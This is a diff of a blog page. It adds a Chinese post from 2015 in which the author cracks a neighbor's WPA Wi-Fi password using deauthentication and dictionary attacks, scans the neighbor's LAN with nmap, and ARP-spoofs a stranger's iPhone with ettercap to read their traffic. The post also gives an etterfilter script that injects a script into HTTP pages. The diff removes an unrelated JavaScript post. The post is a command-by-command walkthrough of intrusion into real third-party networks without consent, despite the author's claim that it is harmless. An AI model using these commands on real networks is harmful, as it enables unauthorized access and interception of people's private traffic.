@@ -179,6 +179,167 @@
 
     
     
+      
+      
+
+      
+    
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/12/25/try-to-snoop-using-wifi/" itemprop="url">
+                  尝试“偷窥”邻居的网络流量
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            Posted on
+            <time itemprop="dateCreated" datetime="2015-12-25T19:35:34+08:00" content="2015-12-25">
+              2015-12-25
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; In
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/security/" itemprop="url" rel="index">
+                    <span itemprop="name">security</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2015/12/25/try-to-snoop-using-wifi/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/25/try-to-snoop-using-wifi/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <h1 id="0x00_折腾的缘由">0x00 折腾的缘由</h1><p>不知什么时候看到<a href="http://lcx.cc/?i=4257" target="_blank" rel="external">这篇文章</a>后，我便对其中主人公对一个模拟的邻居进行攻击的过程产生了好奇，由于原文没有详细描述攻击的每一个步骤，便想着什么时候在一个安全的环境下重现一下。</p>
+<p>首先明确接下来的操作都是安全无害的，虽然的确劫持到了其他人的一些流量，但并没有继续解密流量了，尝试修改流量也只是针对自己设备。</p>
+<p>然后我们来假象这么一个目标，劫持到邻居的流量，这可以用来分析ta，并修改流量，达到浏览器弹窗、修改网页布局的效果。</p>
+<p>这简单的实现可以使用古老但好用的<a href="www.zhihu.com/question/20338649">ARP攻击</a>，将目标的流量欺骗到攻击人的网卡上，便可以开展中间人攻击了。不过这要求我们在同一个局域网中，比如连接了同一个无线路由器。一般可以搜索到邻居的无线路由器，一旦破解了其登陆密码，便可以扫描到目标的设备，进行攻击了。</p>
+<h1 id="0x01_尝试破解Wifi">0x01 尝试破解Wifi</h1><p>一般我们的设备和邻居的设备不在同一内网中，所以第一难关就是攻克无线路由器。如果像我一样，插上网线发现就已经和邻居在同一内网中，那么就可以跳过这一步了。</p>
+<h2 id="使用的武器">使用的武器</h2><p><a href="http://www.aircrack-ng.org/" target="_blank" rel="external">Aircrack-ng</a>是常用的用于破解无线802.11WEP及WPA-PSK加密的工具。Linux用户下载源码编译安装即可。<br>其中需要Ubuntu用户预先<code>apt-get install libnl-3-dev libnl-genl-3-dev</code>安装几个依赖。</p>
+<p>Mercury 150Mbps MW150U是一个无线USB网卡，Ubuntu免驱使用，由于可以开启Monitor模式，既可以用于台式机的无线上网，也可以偶尔做做无线网络的实验。</p>
+<p>查看网卡后发现我的笔记本网卡和USB网卡都可以用于实验：</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">phy0    wlan0       ath9k       Qualcomm Atheros AR9285 Wireless Network</span><br><span class="line">phy1    wlan1       rt2800usb   Ralink Technology, Corp. RT5370</span><br><span class="line"></span><br><span class="line"><span class="escape">``</span>`</span><br></pre></td></tr></table></figure>
+<h2 id="选择攻击目标">选择攻击目标</h2><p>一切就绪，首先让网卡进入Monitor模式，这运行程序获取到更底层的无线网络数据，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng <span class="operator"><span class="keyword">start</span> wlan1</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span></span><br></pre></td></tr></table></figure>
+<p><code>ifconfig</code>后发现<code>wlan1mon</code>。</p>
+<p>继续开始审查周围的无线网络，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng <span class="operator"><span class="keyword">start</span> wlan0</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/try-to-snoop-using-wifi/searching.png" alt="search"></p>
+<p>可以看到周边的无线热点，按照信号强度由强到弱排序，其中<code>BSSID</code>是热点的Mac地址，<code>CH</code>是热点的信道（WIFI2.4Ghz分有13个互相有重叠的信道），<code>ENC</code>是加密方式，可以发现基本都是WPA2加密，<code>ESSID</code>是名称，好了，我们基本就只需要关注这些。</p>
+<p>挑选一个victim，记下它的信息。</p>
+<h2 id="捕获WPA的握手包">捕获WPA的握手包</h2><p>要想破解无线密码，我们先捕捉两台设备成功握手的包。虽然其中也不含密码，但我们可以用这一信息来暴力验证密码字典中的密码是否正确。</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">sudo</span> <span class="comment">airodump</span><span class="literal">-</span><span class="comment">ng</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ivs</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ignore</span><span class="literal">-</span><span class="comment">negative</span><span class="literal">-</span><span class="comment">one</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">bssid</span> <span class="comment">目标热点MAC</span> <span class="literal">-</span><span class="comment">w</span> <span class="comment">保存文件的名称</span> <span class="literal">-</span><span class="comment">c</span> <span class="comment">信道</span> <span class="comment">wlan1mon</span></span><br><span class="line"><span class="comment">```</span></span><br></pre></td></tr></table></figure>
+<p>现在我们看到开始抓包，</p>
+<p><img src="/images/try-to-snoop-using-wifi/waiting-for-handshake.png" alt="waiting-for-handshake"></p>
+<p>不过是否能快速捕获握手包取决于两个因素，信号强弱、是否现在有活跃的设备正在和热点通信。为了尽快获取到握手包，常规做法是广播中断连接的信号，强制踢设备下线，再连接就有我们想要的握手包了。</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -<span class="number">0</span> <span class="number">30</span> -<span class="literal">a</span> 目标热点MAC  wlan1mon</span><br><span class="line"><span class="escape">``</span>`</span><br></pre></td></tr></table></figure>
+<p>幸运地话，很快就能看到握手包捕捉成功，</p>
+<p><img src="/images/try-to-snoop-using-wifi/get-handshake.png" alt="get-handshake"></p>
+<h2 id="离线破解，拼算力的时候到了">离线破解，拼算力的时候到了</h2><p>目前WPA的加密是捕获热点和设备间的握手信息，再离线用密码字典爆破，按理来说都是可以破解的，不过时间不允许我们这么做，由于一般密码很弱，比如8位纯数字，或者是非常常见，如password。一个好的字典囊括了最常见的密码，让我们能瞬间破解很多热点。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w ~/Downloads/dict/<span class="number">0</span>-<span class="number">9.8</span>位纯数密码<span class="class">.txt</span> my-<span class="number">01</span><span class="class">.ivs</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>4T 2.2GHz的破解速度只有90000个/秒的破解速度，把0-9的8位纯数密码扫描一遍要1000分钟了。</p>
+<p>不过常见密码是很好破解的，</p>
+<p><img src="/images/try-to-snoop-using-wifi/get-passwd.png" alt="get-passwd"></p>
+<p>所以，<strong>一定要把无线密码设置得非常特殊，长度12位以上，切记切记</strong>，还有防止软件偷走密码去分享。</p>
+<h1 id="0x02_扫描内网设备">0x02 扫描内网设备</h1><p>成功登入后，首要访问一下<code>192.168.1.1</code>或<code>192.168.1.253</code>，这是路由器管理界面的常见入口，比如我登的就是admin/admin口令，控制了路由器就更加自由了。可以进行DNS攻击，刷路由器固件等。</p>
+<p>如何在不登陆路由器管理界面的情况下，看看内网内的其他设备的情况呢？nmap登场，神级工具之前一直没用过，最近才看到其他人使用。</p>
+<p>简单用法如下，更多请参阅<a href="http://blog.csdn.net/zmj_88888888/article/details/9138399" target="_blank" rel="external">他人的简单的教程</a><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  <span class="tag">nmap</span> <span class="tag">-sP</span> 192<span class="class">.168</span><span class="class">.1</span><span class="class">.1-254</span></span><br><span class="line"></span><br><span class="line"><span class="tag">Nmap</span> <span class="tag">scan</span> <span class="tag">report</span> <span class="tag">for</span> <span class="tag">xxxxxxxdeiPhone</span> (192<span class="class">.168</span><span class="class">.1</span><span class="class">.7</span>)</span><br><span class="line"><span class="tag">Host</span> <span class="tag">is</span> <span class="tag">up</span> (0<span class="class">.031s</span> <span class="tag">latency</span>).</span><br><span class="line"><span class="tag">All</span> 100 <span class="tag">scanned</span> <span class="tag">ports</span> <span class="tag">on</span> <span class="tag">feixiandeiPhone</span> (192<span class="class">.168</span><span class="class">.1</span><span class="class">.7</span>) <span class="tag">are</span> <span class="tag">closed</span></span><br><span class="line"><span class="tag">MAC</span> <span class="rule"><span class="attribute">Address</span>:<span class="value"> XX:XX:XX:XX:XX (Apple)</span><br><span class="line">Too many fingerprints match this host to give specific OS details</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">```</span></span></span><br></pre></td></tr></table></figure></p>
+<p>哈，发现一个人的iPhone。</p>
+<h1 id="0x03_简单进行Arp攻击">0x03 简单进行Arp攻击</h1><p>现在，真正的攻击上演了。我们要将上面找到的victim的流量欺骗到我们的网卡上，<a href="https://ettercap.github.io/ettercap/" target="_blank" rel="external">ettercap</a>登场，<code>apt-get</code>安装即可。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan1 -T -M arp:remote /<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="comment">// /192.168.1.7//</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>执行中间人攻击，欺骗路由器和目标设备，这样本来由目标发下路由器的流量就发给了我方网卡，中转后再发向路由器。</p>
+<h1 id="0x04_审查流量信息">0x04 审查流量信息</h1><p>配合<code>wireshark</code>审查浏览，不过现在HTTPS加密已经流行起来，似乎只有HTTP明文可以被我们分析了。</p>
+<p><img src="/images/try-to-snoop-using-wifi/wireshark.png" alt="wireshark"></p>
+<p>似乎到了饭点，在定外卖……</p>
+<h1 id="0x05_修改流量信息">0x05 修改流量信息</h1><p>接下来攻击自己手机，尝试在HTTP明文中注入脚本。</p>
+<p>还是使用<code>ettercap</code>，其中的<code>fliter</code>功能可以进行简单的文本查找和替换，虽然十分低效。高效的方法需要加入HTTP解析，这样方便过滤和注入。</p>
+<p>fliter代码，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.dst == 80) &#123;</span><br><span class="line">    if (search(DATA.data, "Accept-Encoding")) &#123;</span><br><span class="line">        replace("Accept-Encoding", "Accept-Nothing"); # 防止GZIP压缩</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123;</span><br><span class="line">    replace("<span class="tag">&lt;<span class="title">title</span>&gt;</span>", "<span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">\"text</span>/<span class="attribute">javascript</span>\"&gt;</span><span class="actionscript">alert(<span class="string">'Hack'</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>");</span><br><span class="line">    replace("<span class="tag">&lt;<span class="title">title</span>&gt;</span>","<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="tag">html</span><span class="rules">&#123;<span class="rule"><span class="attribute">overflow-y</span>:<span class="value">scroll</span></span>;<span class="rule"><span class="attribute">filter</span>:<span class="value">progid:DXImageTransform.Microsoft.<span class="function">BasicImage</span>(grayscale=<span class="number">1</span>)</span></span>;<span class="rule"><span class="attribute">-webkit-filter</span>:<span class="value"><span class="function">grayscale</span>(<span class="number">100%</span>)</span></span>;&#125;</span></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>");</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>预先编译为<code>ettercap</code>可加载的二进制模块，</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">etterfilter f.filter -o <span class="function"><span class="keyword">fun</span>.<span class="title">ef</span></span></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
+<p>重新进行攻击，这时候流量被匹配后修改，</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan0 -<span class="constant">T</span> -<span class="constant">M</span> <span class="symbol">arp:</span>remote -<span class="constant">F</span> <span class="function"><span class="keyword">fun</span>.<span class="title">ef</span></span> /<span class="number">192.168</span>.<span class="number">31.1</span>/<span class="regexp">/ /</span><span class="number">192.168</span>.<span class="number">31.155</span>/<span class="regexp">/</span><br><span class="line"></span><br><span class="line">```</span></span><br></pre></td></tr></table></figure>
+<p>攻击效果，</p>
+<p><img src="/images/try-to-snoop-using-wifi/v2ex.jpg" alt="v2ex"></p>
+<p>脚本注入</p>
+<p><img src="/images/try-to-snoop-using-wifi/smzdm.jpg" alt="smzdm"></p>
+<p>哈，灰色默哀</p>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
 
     
       
@@ -974,133 +1135,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/11/28/check-js-var-update/" itemprop="url">
-                  检测Javascript中变量的修改
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            Posted on
-            <time itemprop="dateCreated" datetime="2015-11-28T16:20:08+08:00" content="2015-11-28">
-              2015-11-28
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; In
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/programming/" itemprop="url" rel="index">
-                    <span itemprop="name">programming</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2015/11/28/check-js-var-update/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/28/check-js-var-update/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <h1 id="问题描述">问题描述</h1><p>目前在做的小项目中，我们在浏览器中通过Hook浏览器的API，截获目标程序对浏览器API的调用。比如对于Webgl的网页程序，我们就能截获所有的gl指令，这其中主要是截获参数列表。把这些gl指令翻译为Opengl ES标准的话便可以编译为一个其他设备上的原生应用了。</p>
-<p>图形的绘制过程中经常会有大量的数组需要传递入GPU，这就造成了我们截获了大量的数组。如果想直接把这些数据保存在浏览器内存中，压力很大，实时流到其他服务器上的话也带来了stringfy瓶颈和传输瓶颈。虽然对于Javascript中的Typed Array，我们现在直接二进制传输到服务器上，是否能只传输变化的数组，或者是只传输数组的delta，这个是一个潜在的优化。当然，如果发现大部分要传输的数组都是改变过的话，或者是检测改变的开销大于直接传输的开销（毕竟是CPU时间对抗IO时间，而且由于检测比如会使目标程序运行变慢），完全便可以不考虑进行数组改变的检测了。</p>
-<p>对于给定Javascript的TypedArray，我们的目标便是当截获到的gl指令需要使用它的时候，我们需要能知道它是否内容发生了改动，更进一步能记录出上次截获到这次截获间的delta。<br>花了一些时间进行探索，然而最后还是无解，并也没有方法能占用资源尽量少地做到标记修改，记录如下。</p>
-<h1 id="暴力检测">暴力检测</h1><p>这个方法不需要多说，不过检测的时间消耗太多，由于消耗了Webgl每帧的CPU时间，很容易造成CPU性能瓶颈，导致Fps下降。</p>
-<h1 id="Object-observe()_/_Array-observe()">Object.observe() / Array.observe()</h1><p>最先查询到的便是两个内建的API，直接来看MDN上的使用：<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">    foo: <span class="number">0</span>,</span><br><span class="line">    bar: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.observe(obj, <span class="keyword">function</span>(changes) &#123;</span><br><span class="line">    console.log(changes);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.baz = <span class="number">2</span>;</span><br><span class="line">// [&#123;name: <span class="string">'baz'</span>, object: &lt;obj&gt;, type: <span class="string">'add'</span>&#125;]</span><br><span class="line"></span><br><span class="line">obj.foo = <span class="string">'hello'</span>;</span><br><span class="line">// [&#123;name: <span class="string">'foo'</span>, object: &lt;obj&gt;, type: <span class="string">'update'</span>, oldValue: <span class="number">0</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.baz;</span><br><span class="line">// [&#123;name: <span class="string">'baz'</span>, object: &lt;obj&gt;, type: <span class="string">'delete'</span>, oldValue: <span class="number">2</span>&#125;]</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p>
-<p>一开始看到的时候感觉非常符合我的需求，并且还区分了改动的类型，比如<code>update</code>、<code>add</code>、<code>delete</code>类型。<br>应该现在很多前端的工具就使用Observe便可以完全数据到显示的单向同步了。<br>于是尝试了一下在Typed Array上的操作：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = <span class="keyword">new</span> Int16Array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">Object.observe(obj, function(changes) &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(changes);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj[<span class="number">0</span>] = <span class="number">9</span>; <span class="comment">// changed</span></span><br><span class="line">obj[<span class="number">0</span>] = <span class="number">9</span>; <span class="comment">// unchanged</span></span><br><span class="line">obj.sort(); <span class="comment">// changed</span></span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
-<p>不过后来看到这么一个解释:</p>
-<blockquote>
-<p>The Object.observe() method is used for asynchronously observing the changes<br>to an object. It provides a stream of changes in the order in which they<br>occur.</p>
-</blockquote>
-<p>说明变更事件是异步通知的，比如可以这样实验一下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Int16Array</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">a.isDirty = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">Object</span>.observe(a, <span class="function"><span class="keyword">function</span>(<span class="params">changes</span>) </span>&#123;</span><br><span class="line">      a.isDirty = <span class="literal">true</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'c'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">a[<span class="number">0</span>]=<span class="number">9</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.isDirty);</span><br><span class="line">setTimeout(<span class="string">'console.log(a.isDirty);'</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">c</span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
-<p>这就带来了问题，由于Javascript执行是单线程的，可能在webgl程序刚修改完后便被我截获了这个数组，但修改通知没到，我就已经错误判断数组未改变了，由于我相当于是对每个gl命令的参数进行快照，无法在未来进行记录，如果停止我当前线程的，会带来严重的性能问题。</p>
-<h1 id="Object-defineProperty">Object.defineProperty</h1><p>这个方法可以为对象定义属性，并能对属性的访问进行详细的控制，最简单的话我们给定义get和set函数，举例说明：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> shadow = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(arr, <span class="string">'0'</span>, &#123;</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'get'</span>);</span><br><span class="line">    <span class="keyword">return</span> shadow[<span class="string">'0'</span>];</span><br><span class="line">  &#125;,</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'set'</span>);</span><br><span class="line">    shadow[<span class="string">'0'</span>] = v;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
-<p>通常对外暴露的get，set中要访问一个内部的变量，以防止递归访问属性的get或是set。<br>这个方法其实是多加入了一个proxy的对象。并且TypedArray并不能重写数字属性的get/set，只能通过一个proxy对象了。</p>
-<p>一个简陋的实现，直接替换浏览器中提供的API:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _Float32Array = <span class="built_in">Float32Array</span>;</span><br><span class="line"><span class="built_in">Float32Array</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 这里需要罗列出内部的属性和函数名</span></span><br><span class="line">  <span class="comment">// 因为数组类型只能for遍历数字属性</span></span><br><span class="line">  <span class="keyword">var</span> list = [</span><br><span class="line">    <span class="string">"BYTES_PER_ELEMENT"</span>,</span><br><span class="line">    <span class="string">"__defineGetter__"</span>,</span><br><span class="line">    <span class="string">"__defineSetter__"</span>,</span><br><span class="line">    <span class="string">"__lookupGetter__"</span>,</span><br><span class="line">    <span class="string">"__lookupSetter__"</span>,</span><br><span class="line">    <span class="string">"constructor"</span>,</span><br><span class="line">    <span class="string">"buffer"</span>,</span><br><span class="line">    <span class="string">"byteLength"</span>,</span><br><span class="line">    <span class="string">"byteOffset"</span>,</span><br><span class="line">    <span class="string">"entries"</span>,</span><br><span class="line">    <span class="string">"hasOwnProperty"</span>,</span><br><span class="line">    <span class="string">"isPrototypeOf"</span>,</span><br><span class="line">    <span class="string">"keys"</span>,</span><br><span class="line">    <span class="string">"length"</span>,</span><br><span class="line">    <span class="string">"propertyIsEnumerable"</span>,</span><br><span class="line">    <span class="string">"set"</span>,</span><br><span class="line">    <span class="string">"subarray"</span>,</span><br><span class="line">    <span class="string">"toLocaleString"</span>,</span><br><span class="line">    <span class="string">"toString"</span>,</span><br><span class="line">    <span class="string">"valueOf"</span>,</span><br><span class="line">    <span class="string">"values"</span>,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化的函数可能会有三个参数，还未处理</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="keyword">new</span> _Float32Array(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.a = a;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">this</span>.isDirty = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  list.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(a[key]) == <span class="string">'function'</span>) &#123;</span><br><span class="line">      b[key] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        b.isDirty = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'invoke'</span>, key);</span><br><span class="line">        <span class="keyword">return</span> a[key].apply(a, <span class="built_in">arguments</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(b, key, &#123;</span><br><span class="line">        configurable: <span class="literal">true</span>,</span><br><span class="line">        enumerable: <span class="literal">true</span>,</span><br><span class="line">        get: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'get member'</span>,i);</span><br><span class="line">            <span class="keyword">return</span> a[i];</span><br><span class="line">          &#125;</span><br><span class="line">        